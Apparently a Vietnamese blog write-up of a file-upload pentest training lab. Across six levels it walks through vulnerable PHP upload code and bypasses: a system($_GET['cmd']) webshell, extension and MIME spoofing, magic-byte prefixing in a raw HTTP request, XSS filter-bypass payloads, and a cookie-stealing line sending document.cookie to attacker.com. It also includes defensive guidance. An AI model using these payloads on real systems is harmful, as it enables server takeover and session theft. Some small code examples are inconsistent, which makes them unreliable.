---
title: "Cyber Jutsu: Web Pentest 101 - File Upload"
date: 2025-06-05
categories: [cyber-jutsu, writeups]
tags: [web-pentest-101]
---

# FILE UPLOAD VULNERABILITIES

## The Web Foundation - Kỷ nguyên của lỗi bảo mật

## 1. Tóm tắt lịch sử thế giới WEB

- World Wide Web (WWW) tạo ra năm 1989, bởi Tim Berners-Lee.
- Mục đích: Chia sẻ bài báo khoa học → Thường xuyên tham khảo bài báo khoa học khác
    
    ⇒ Hyperlink
    

![](/assets/img/posts/file_upload/image.png)

Trang web đầu tiên: https://info.cern.ch/hypertext/WWW/TheProject.html (Phục dựng)

Vấn đề của 2 phiên bản này: Không xử lý được user input, read-only web

⇒ Version 1.1 ra đời.

![](/assets/img/posts/file_upload/image1.png)

- Web 2.0: User có thể tạo ra content, đăng tải lên trên các website.

⚔️ Web server có thể nhận vào và xử lý unstrusted data → Kỷ nguyên của những lỗi bảo mật.

### 2. Cơ chế hoạt động của HTTPd:

- HTTPd (HTTP daemon): nơi đầu tiên nhận và xử lý gói tin HTTP của user gửi đến.
    
    ![](/assets/img/posts/file_upload/image2.png)
    
    - Document Root: là đường dẫn tới thư mục chứa tất cả tài nguyên của trang web (home.html, index.php, images, …)
    - Có thể ví Document Root như nhà bếp trong nhà hàng → chứa các món ăn có sẵn, hoặc món ăn cần chế biến để phục vụ KH.
    - Document Root mặc định có đường dẫn: /var/www/html
    - Khi user truy cập vào home.html thì HTTPd vào Document Root để tìm file đó và trả về cho user.
    
    Quá trình một file PHP được xử lý:
    
    ![](/assets/img/posts/file_upload/image3.png)
    
    - Module php là cây cầu nối giữa Apache và PHP.
        
        libapache2-mod-php
        
    - Khi có request đến Apache sẽ nhìn vào phần đuôi file để quyết định sẽ xử lý nó như thế nào.
    - Trong trường hợp là file PHP, Apache sẽ truyền qua cho module php xử lý → Apache trả về kết quả thực thi cho user.

### 3. Docker là gì? Kiến thức cơ bản về Docker

Docker là một nền tảng giúp các nhà phát triển và quản trị hệ thống dễ dàng phát triển, triển khai và chạy ứng dụng trong các môi trường độc lập gọi là container. Container cho phép đóng gói ứng dụng cùng với tất cả các thư viện và cấu hình cần thiết, giúp đảm bảo ứng dụng chạy nhất quán trên mọi môi trường

- Lợi ích:
    - Khởi động nhanh hơn máy ảo
    - Dễ triển khai và chia sẻ → Tính di động cao
    - Dễ dàng thiết lập môi trường làm việc → không lo “chạy được trên máy tôi nhưng không chạy được trên máy bạn”
- Thành phần chính:
    - Docker Engine: Hệ thống chạy container
    - Image: Mẫu tạo container
    - Container: Ứng dụng đang chạy
    - Docker Hub: Kho chứa image
    - Dockerfile: File mô tả cách tạo ra image
- Khái niệm cơ bản trong Docker:
    - **Docker Client:** Công cụ dòng lệnh cho phép người dùng tương tác với Docker thông qua terminal.
    - **Docker Daemon:** Dịch vụ chạy ngầm, quản lý các thành phần như images, containers, networks và volumes.
    - **Docker Registry:** Kho lưu trữ các Docker images, nơi người dùng có thể tải lên hoặc tải về các images.
    - **Docker Hub:** Docker Registry công khai lớn nhất, cung cấp nhiều images có sẵn cho người dùng.
    - **Docker Compose:** Công cụ giúp quản lý và chạy ứng dụng sử dụng nhiều container thông qua file cấu hình `docker-compose.yml`
- Dockerfike: cấu hình chứa các lệnh để xây dựng một Docker image. Một số lệnh thường dùng trong Dockerfile gồm:
    - **FROM:** Chỉ định image cơ sở để xây dựng.
    - **LABEL:** Cung cấp metadata cho image, như thông tin về người tạo.
    - **ENV:** Thiết lập các biến môi trường.
    - **RUN:** Thực thi các lệnh trong quá trình build image, thường dùng để cài đặt các package cần thiết.
    - **COPY và ADD:** Sao chép các file và thư mục vào image.
    - **CMD:** Xác định lệnh mặc định sẽ được thực thi khi container khởi chạy.

🧐 Tư duy tò mò:

- Khi đọc mã nguồn sẽ có những chỗ chưa hiểu, bạn có thể:
    - Sử dụng hàm vardump() trong PHP để in ra dữ liệu ra.
    - Đọc document về hàm chưa biết trên [https://php.net/](https://php.net/).
    - Hỏi GPT
    
    ![](/assets/img/posts/file_upload/image4.png)
    
    ❔Tác động vật lý đên biến $_FILE này?
    
    ⇒ Sử dụng BurpSuite, thử thay đổi thông tin có trong gói HTTP request khi upload file và quan sát xem đâu là untrusted data trong biến $_FILES
    
    ### Quá trình upload file lên PHP
    
    ![](/assets/img/posts/file_upload/image5.png)
    
- Khi người udngf upload một file lên, PHP sẽ tạm thời lưu tập tin ở /tmp/phpXXXX (XXXX là chuỗi ngẫu nhiên)
- Vì là file tạm → để lưu lại, lập trình viên cần di chuyển ra thư mục khác bằng hàm *move_uploaded_files( )*
    
    ```php
    move_upload_file($_FILE["file"]["tmp_name"], './upload/' .$_FILE["file"]["name"]);
    ```
    

![](/assets/img/posts/file_upload/image6.png)

VD: File được move ra thư mục /var/www/html/upload

## Tư duy Hacking:

- Hack là tận dụng hành vi có sẵn. Mà hành vi của thế giới máy tính đa số đều đến từ mã nguồn.
- Thay vì sử dụng cheatsheet hay cứ cố làm cho được mà không hiểu bản chất phía sau, bạn hãy thử đặt những câu hỏi giúp mở rộng hướng suy nghĩ với một số mẫu câu gợi ý như:
    - Sẽ ra sao nếu ta lợi dụng ... để làm ...
    - Có nhất thiết phải ...
    - Liệu rằng ... có làm được ...

![](/assets/img/posts/file_upload/image7.png)

## Write-up Lab:

### Level 1:

```php
'''
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
'''
```

Brainstorm: Nếu upload một file đuôi .php lên thì điều gì xảy ra?

→ HTTPd sẽ thực thi code PHP nếu như thấy tập tin có đuôi là .php

![](/assets/img/posts/file_upload/image8.png)

Sau khi upload file hehe.php → HTTPd tìm thấy file hehe có đuôi là .php và xử lý.

![](/assets/img/posts/file_upload/image9.png)

👉 phpinfo(); chỉ là một lệnh ví dụ để chứng minh rằng giả thiết thành công. Tất nhiên hacker sẽ còn upload những con webshell/backdoor để cày nát server nạn nhân. Chẳng hạn chạy hàm system để thực thi những lệnh OS command, từ đó có thể cho bay màu server luôn.

Attacker upload một file mới tên shell.php có nội dung:

```php
<?php
system($_GET[cmd]);
?>
```

P/S: Hàm system - Execute an external program and display the output

Nói ví von: Quá trình khai thác file upload, cũng giống như việc con mèo tạo ra menu để thao túng chú đầu bếp (mod-php) nhằm nấu ra những món ăn gây hại.

![](/assets/img/posts/file_upload/image10.png)

⇒ HINT: Ghi file PHP vào DocumentRoot

### Level 2:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = explode(".", $filename)[1];
        if ($extension === "php") {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

🧐 Nếu up file PHP vào DocumentRoot như Level 1 thì điều gì xảy ra?

→ Hack Detected!

❔Vì: Anh lập trình viên phòng chống bằng cách không cho upload file php.

**Hướng giải quyết:** 

Phần extension được lấy từ *$filename* bằng cách sử dụng hàm explode để
tách các chuỗi ngăn cách bởi dấu chấm. Sau đó extension sẽ là chuỗi đầu
tiên đằng sau dấu chấm ( index[1] )

→ Upload file có tên là shell.txt.php

Hàm explode sẽ xử lý: shell.txt.php → [test, abc, php]

Vì đoạn code đang kiểm tra phần tử đầu tiên sau dấu chấm nên extension sẽ là abc

⇒ Bypass được extension check và upload file php thành công.

![](/assets/img/posts/file_upload/image11.png)

![](/assets/img/posts/file_upload/image12.png)

⇒ Lỗ hổng nằm trong cách kiểm tra đuôi → Bất tương đồng giữa hai thứ

### Level 3:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if ($extension === "php") {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Ở Level này, anh DEV đã sử dụng hàm ***end*** để luôn lấy phần tử cuối cùng sau dấu chấm → sửa sai :V 

```php
        $extension = end(explode(".", $filename));
        if ($extension === "php") {
            die("Hack detected");
        }
```

⇒ Cách tiếp cận cũ đã không còn hiệu lực 😅

![](/assets/img/posts/file_upload/image13.png)

**Brainstorm 🤯:** 

- Apache còn xử lý được đuôi file nào khác php không?
- Sẽ ra sao nếu upload 1 filename nó khác đuôi php liệu rằng mod-php có xử lý?

❔ Làm sao để tìm ra mấy cái đuôi đó đây? Config nào? Chỗ nào quy định điều đó? 

Trong folder Level 3, chúng ta thấy có 1 file tên là: ***docker_php.conf***

```php
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

DirectoryIndex disabled
DirectoryIndex index.php index.html

<LocationMatch ^/upload/$>
    Order deny,allow
    Deny from all
</LocationMatch>
```

⇒ Phát hiện các đuôi file khác của mod-php -> php/phar/phphtml

Xuất hiện 2 directive:

- FilesMatch: apply một biểu thức chính quy match với các filename cụ thể thì sẽ thực hiện các hành động directive tiếp theo
- SetHandler: Gán một handler cụ thể để xử lý các files. Trong trường hợp này là mod-php (application/x-httpd-php**)**

Apache2 config file được dùng để:

- Cấu hình cho các hành vi và chức năng của nó như
    - Document root
    - File Handler
    - Encryption
    - Error Messages
    - Gần 200 config khác nhau…
- Nơi mà các apache2 config file thường được lưu ở:
    - /etc/apache2
    - /etc/apache2/sites-available
    - /etc/apache2/site-enabled
    - /etc/apache2/mods-available
    - /etc/apache2/conf-available

⇒ **Bất kỳ file nào có đuôi là .php, .phar, .phtml đều sẽ được mod-php xử lý.**

### Level 4:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if (in_array($extension, ["php", "phtml", "phar"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Ta thấy rằng cả 3 loại extension đã bị chặn bằng hàm in_array. 

```php
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if (in_array($extension, ["php", "phtml", "phar"])) {
            die("Hack detected");
```

![](/assets/img/posts/file_upload/image14.png)

- 3 levels trước mình hack toàn là dựa vào hành vi có sẵn của Apache và code PHP của developer.
- Liệu có còn cách nào khác mà không cần đến cả đó không?

**Phương pháp: Thực hiện RCE Server:**

File .htaccess được dùng để tạo ra các config cục bộ của các folder ngang hàng nó.

→ Tạo ra file .htaccess để thao thúng mod-php khiến nó thực thi đuôi .txt như là code php

- .htaccess là một file config, được phân bổ ở các thư mục
- Chỉ có hiệu lực cục bộ/local ở folder đang chứa nó và các thư mục con.

# (Nâng cao) XSS on Level 4

**CVE-2018-9206: jQuery File Upload RCE**

### Tìm hiểu về jQuery File Upload:

jQuery File Upload là một **plugin mã nguồn mở** phổ biến để **tải tệp lên từ phía client** bằng JavaScript. Plugin này hỗ trợ **upload nhiều file**, **drag & drop**, **progress bar**, và **các callback** như `done`, `fail`, `progress`.

Plugin này tương thích với nhiều backend server như PHP, Python, Node.js, Java thông qua thư mục `server/` trong source code.

### 🔧 **jQuery File Upload gồm 2 phần chính:**

1. Client-side (JS/jQuery)
    - Tạo gian diện upload file.
    - Sử dụng Ajax để gửi file lên server không cần reload.
    - Có thể dùng các input file hoặc drag & drop.
2. Server-side (PHP):
    - tiếp nhận file, lưu trữ vào thư mục tạm hoặc thư mục chỉ định.
    - Có thể rename file, kiểm tra kích thước, loại file,…
    - Trả về JSON response cho phía client biết upload thành công hay không.

### 🛡️ **Cách jQuery File Upload phòng chống bị hack**

Bản thân jQuery File Upload **chỉ là công cụ hỗ trợ**, còn việc bảo mật **phụ thuộc rất nhiều vào cấu hình phía server**.

| Mục tiêu bảo mật | Cách xử lý |
| --- | --- |
| ❌ Tránh thực thi file độc hại | - Không cho upload file `.php`, `.exe`, `.sh`... - Đổi tên file sau khi upload. - Không lưu file vào thư mục có thể truy cập trực tiếp. - Hoặc cấu hình chặn thực thi script trong thư mục upload. |
| 🧪 Xác minh loại file | - Kiểm tra **MIME-type thực sự** bằng `finfo_file()` (PHP). - Không tin tưởng hoàn toàn header `Content-Type` từ client. |
| 🔒 Giới hạn quyền | - Thư mục upload nên có quyền ghi (write-only), không thực thi (no-execute). |
| 📁 Kiểm tra dung lượng | - Giới hạn kích thước file (`max_file_size`). |
| 💡 Cấu hình Web Server | - Apache: dùng `php_admin_flag engine off` trong vHost để vô hiệu PHP trong `/uploads`. - Nginx: dùng `location ~ \.php$ { deny all; }` cho thư mục upload. |
| 🔍 Logging | - Ghi log file upload, IP client, để dễ điều tra sự cố. |
| 🔁 Phiên bản mới | - Luôn cập nhật jQuery File Upload lên bản mới nhất để tránh các lỗ hổng như CVE-2018-9206. |

### 🚫 Những sai lầm phổ biến khi sử dụng jQuery File Upload

- Chỉ dựa vào .htaccess để chặn file PHP. Tuy nhiên **Từ Apache 2.4.7**, mặc định **AllowOverride None** khiến `.htaccess` bị **vô hiệu hóa**.
- **Không kiểm tra MIME-type thực sự**, chỉ dựa vào `$_FILES['type']`.
- **Cho phép truy cập trực tiếp thư mục upload**, tạo điều kiện thực thi file độc hại.
- **Không giới hạn extension**, dẫn tới upload shell hoặc mã độc.

### Tóm tắt lỗ hổng:

- **CVE ID:** CVE-2018-9206
- **Mức độ nghiêm trọng:** Cao (CVSS khoảng 8.8 - 9.8 tùy theo môi trường triển khai)
- **Ảnh hưởng:** Thực thi mã từ xa (RCE) thông qua tệp tải lên độc hại.
- **Thành phần bị ảnh hưởng:** jQuery File Upload (đa số các phiên bản từ 9.x đến trước 9.24.1)
- **Tác giả phát hiện:** Larry Cashdollar (Akamai)

**Nguyên nhân:**

jQuery File Upload vốn thiết kế để hỗ trợ nhiều nền tảng máy chủ (Apache, Nginx, IIS,...). Trong quá khứ, plugin này dựa vào **Apache `.htaccess`** để bảo vệ thư mục upload khỏi việc thực thi các file độc hại (ví dụ như `.php`). Tuy nhiên:

- **Từ Apache 2.4.7**, mặc định **AllowOverride None** khiến `.htaccess` bị **vô hiệu hóa**.
- Điều đó có nghĩa là **người dùng có thể tải lên file PHP hoặc script độc hại**, và sau đó **truy cập trực tiếp file đó trên máy chủ**.

Kết quả là **attacker có thể thực thi mã từ xa** trên server thông qua file tải lên độc hại (ví dụ `shell.php`).

Quay lại Level 4: 

Nãy giờ chúng ta đã quá tập trung vào phần server back-end, liệu rằng ở phía
web front-end có rủi ro nào có thể xảy ra?

![](/assets/img/posts/file_upload/image15.png)

- Khi một người dùng truy cập vào đường dẫn đến file upload, trong trường hợp này, đối tượng xử lý untrusted file là trình duyệt. Sẽ ra sao nếu ta upload một file HTML?
- Không những có thể sử dụng các tag HTML thông thường như <h1>, <b>, <marquee>,… ta còn có thể tận dụng tag <script> để thực thi được code JavaScript trên trình duyệt nạn nhân.
- Để đánh cắp cookie, ta cần tìm cách để vận chuyển cookie đến server attacker:
    
    VD: 
    
    ```html
    new Image().src = "[https://attacker.com/“](https://attacker.com/%E2%80%9C) + document.cookie
    ```
    

⇒  Lúc này cookie của nạn nhân đang xem file html đó sẽ được gửi về website của attacker.

## Vấn đề của Blacklist và Whitelist:

### Vấn đề của Blacklist:

Blacklist là danh sách bị cấm - mọi thứ ngoài danh sách đều được chấp nhận, chỉ những gì nằm trong danh sách mới bị từ chối.

### 📌 Ví dụ:

- Chặn các file `.php`, `.exe`, `.js`.
- Chặn các từ nguy hiểm như `<script>`, `eval()`, `alert()`.
- Chặn IP hoặc domain độc hại.

### ✅ Ưu điểm:

- Dễ hình dung: “Chặn những gì nguy hiểm đã biết”.
- Dễ triển khai ban đầu (ví dụ: chặn `.php`, `<script>`, `eval()`...).

### ❌ Nhược điểm lớn:

| Vấn đề | Mô tả |
| --- | --- |
| **Không đầy đủ** | Kẻ tấn công có thể sử dụng **bypass**, ví dụ:`<scr<script>ipt>` hoặc `<?ph\p echo ... ?>` |
| **Luôn theo sau attacker** | Phải liên tục cập nhật theo kỹ thuật tấn công mới. |
| **Không phù hợp cho dữ liệu phức tạp** | Ví dụ: biểu thức chính quy lọc tag HTML dễ gây lỗi khi xử lý tiếng Việt hoặc ngôn ngữ khác. |

### 👉 **Ví dụ dễ bypass Blacklist:**

Nếu blacklist chỉ chặn `"script"`, attacker có thể dùng:

```html
<svg onload=alert(1)>
```

[](data:image/svg+xml;utf8,%3Csvg%20onload%3D%22alert(1)%22%3E%0A%3C%2Fsvg%3E)

Hoặc

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

### Vấn đề của Whitelist:

Whitelist là danh sách cho phép - chỉ những gì nằm trong danh sách này mới được chấp nhận.

### 📌 Ví dụ:

- **Chỉ cho phép** upload file có đuôi `.jpg`, `.png`, `.gif`.
- **Chỉ cho phép** người dùng từ địa chỉ IP nhất định truy cập hệ thống.
- **Chỉ cho phép** ký tự a–z, A–Z, 0–9 trong tên người dùng.

### ✅ Ưu điểm:

| Lợi ích | Mô tả |
| --- | --- |
| **An toàn hơn** | Chỉ cho phép đúng định dạng đã được kiểm soát. |
| **Giảm khả năng bị bypass** | Nếu giới hạn rõ ràng, ví dụ: chỉ cho phép JPG, PNG với MIME thực sự. |
| **Thích hợp cho đầu vào quan trọng** | Như file upload, số điện thoại, email, mã OTP,... |

### ❌ Nhược điểm:

- **Hạn chế linh hoạt**: Có thể chặn người dùng hợp lệ nếu quy định quá chặt.
- **Cần hiểu rõ dữ liệu đầu vào hợp lệ**: Nếu định nghĩa whitelist sai → mất chức năng.

## Level 5:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $mime_type = $_FILES["file"]["type"];
        if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Để ý rằng, trong source code có đoạn:

```php
    try {
        $mime_type = $_FILES["file"]["type"];
        if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
            die("Hack detected");
        }
```

Ở Level 5 này, server kiểm tra *MIME type* của file upload (tức là `$_FILES["file"]["type"]`) và chỉ cho phép:

- `image/jpeg`
- `image/png`
- `image/gif`

Tuy nhiên, đoạn kiểm tra này **không xác thực nội dung thật của file** mà chỉ dựa vào thông tin gửi từ client (tức là từ trình duyệt hoặc tool gửi HTTP request).

Ta thử upload một file .jpg lên:

![](/assets/img/posts/file_upload/image16.png)

- Dựa vào $_FILES['type'] ta có thể thấy anh lập trình viên đang kiểm tra liệu Content-Type có bằng image/jpeg không.
- Nhưng vì Content-Type là một header trong HTTP request nên ta có thể dễ dàng thay đổi giá trị của nó bằng Burp Suite.

⇒ Hướng khai thác: Bypass MIME check bằng cách **giả mạo MIME type** trong HTTP request thủ công. Upload một file php và đổi Content-Type thành image/jpeg.

## Level 6:

Source Code:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
        $whitelist = array("image/jpeg", "image/png", "image/gif");
        if (!in_array($mime_type, $whitelist, TRUE)) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Ở level này, anh Dev đa kiểm tra nội dung file.

**File Signature:**

![](/assets/img/posts/file_upload/image17.png)

Các loại file khác nhau sẽ được xác đ nh bằng một vài byte đầu tiên của file,
gọi là file signature (chữ ký đầu tệp).

```php
try {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
        $whitelist = array("image/jpeg", "image/png", "image/gif");
        if (!in_array($mime_type, $whitelist, TRUE)) {
            die("Hack detected");
        }
```

- `finfo_file` sẽ so sánh chữ ký đầu tiệp của các file trong magic database để đưa ra kết luận tập tin gì.
- Magic database là nơi chứa tất cả chữ ký đầu tệp của cac file tương ứng.
- Server lấy file signature bằng finfo_file và kiểm tra với whitelist `("image/jpeg", "image/png", "image/gif")`.

⇒ Cách khai thác: Up load file với nội dung có dạng `<magic_bytes><php_code>`

```html
POST / HTTP/1.1
Host: fileupload.cyberjutsu-lab.tech:12006
Content-Length: 222
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://fileupload.cyberjutsu-lab.tech:12006
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVm1h6lgwrRqcHHuq
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://fileupload.cyberjutsu-lab.tech:12006/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=4eed8e76df0310a3e8f3b5a5667da8c9
Connection: keep-alive

------WebKitFormBoundaryVm1h6lgwrRqcHHuq
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

***GIF89 #file signature**
<?php system($_GET['cmd']); ?>*

------WebKitFormBoundaryVm1h6lgwrRqcHHuq--

```
